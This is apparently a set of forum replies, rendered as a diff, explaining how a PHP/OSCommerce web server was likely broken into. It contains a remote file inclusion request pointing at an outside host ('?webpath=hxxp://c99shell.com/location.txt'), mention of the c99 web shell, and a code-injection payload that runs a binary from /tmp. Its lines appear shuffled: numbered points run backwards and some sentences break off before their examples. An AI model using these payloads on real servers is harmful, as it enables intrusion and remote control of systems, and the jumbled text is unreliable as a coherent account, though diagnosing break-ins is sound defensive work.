@@ -1,0 +1,11 @@
+4) There's a homebrew PHP script with weak input validation / a known vulnerability in some CMS or other software installed.
+which allows them to write a file to the disk that can be remotely executed.  It is also possible that they used an XSS exploit in your code to do something like:
+If a PHP script does not validate the input, the URL parameters (or POST request) could contain stuff like <?php system("/tmp/pwn4g3"); ?>. karmawhore already explained this.
+3) Server has /var/www (or whatever the mount point for webroot is) mounted with default settings; this means it allows files to be executed.
+and a request was sent through with ?webpath=hxxp://c99shell.com/location.txt?  which gave them a remote shell.  Once they got the remote shell, they tried to run wget/lynx (or uploaded a shell script to run a number of methods to make sure their payload was installed)
+2) Server has /tmp (or whatever the temp directory for http uploads is) mounted with default settings; this means it allows files to be executed.
+1) Server has PHP running with default settings; this means no safe_mode, all the POSIX functions are allowed (such as system()) and couple of versatile yet dangerous PHP modules, such as curl, are activated
+If you're not running OSCommerce, look for hits on your include files.  I.e. you may have a function.php file that shouldn't be called directly that has:
+I would guess that register_globals is turned on and you're running OSCommerce without the four patches in their forums.  Why they refuse to update the .zip/.gz files with the patches, I don't know.
+In an environment like this an attacker can upload an evil file via http or instruct the server to fetch one from a remote server, and then just run that script by passing some URL parameters which lacks input validation. 
+I suppose that max.txt is probably c99 shell and is downloaded into your /store/images path as something.php.  Once they are able to run that file in a browser, they have a remote shell.
